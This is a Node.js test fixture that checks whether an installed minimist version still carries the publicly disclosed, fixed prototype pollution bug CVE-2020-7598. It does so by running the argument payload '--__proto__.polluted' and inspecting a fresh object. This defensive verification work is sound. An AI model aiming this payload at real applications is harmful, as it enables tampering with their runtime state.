#!/usr/bin/env node
/*
 * Patch-verification fixture — minimist CVE-2020-7598 (GHSA-vh95-rmgr-6w4m).
 * A SECOND, distinct bug from the one in poc/poc.js: this is the earlier
 * Object.prototype pollution via `__proto__`, publicly disclosed and FIXED in
 * minimist 1.2.3 (years ago). It lives here only so the room can confirm, by
 * building and running, whether a given version still carries it.
 *
 * Same mechanical contract as poc/poc.js:
 *   exit 0 -> TRIGGERED  (version affected)
 *   exit 1 -> SAFE       (version not affected)
 */
'use strict';

// Optional first arg: path to the package under test; else the installed one.
const target = process.argv[2] || 'minimist';
let minimist;
try {
  minimist = require(target);
} catch (e) {
  console.error('ERROR: could not load minimist from ' + target + ':', e.message);
  process.exit(2);
}

// The public CVE-2020-7598 vector: a dotted option name whose first segment is
// __proto__ reaches Object.prototype. Fixed versions ignore the __proto__ key.
const argv = ['--__proto__.polluted', 'yes'];

try {
  minimist(argv);
} catch (e) {
  // A throw is fine; the effect is what we check.
}

// Victim: a brand-new, unrelated plain object. If it now carries `polluted`,
// Object.prototype was globally poisoned.
const victim = {};

let version = 'unknown';
try { version = require(target + '/package.json').version; } catch (e) {}

if (victim.polluted === 'yes') {
  console.log('RESULT: TRIGGERED  Object.prototype.polluted === "yes"');
  console.log('  payload: ' + JSON.stringify(argv));
  console.log('  minimist: ' + version + '  (' + target + ')');
  process.exit(0);
} else {
  console.log('RESULT: SAFE  prototype was not polluted');
  console.log('  minimist: ' + version + '  (' + target + ')');
  process.exit(1);
}
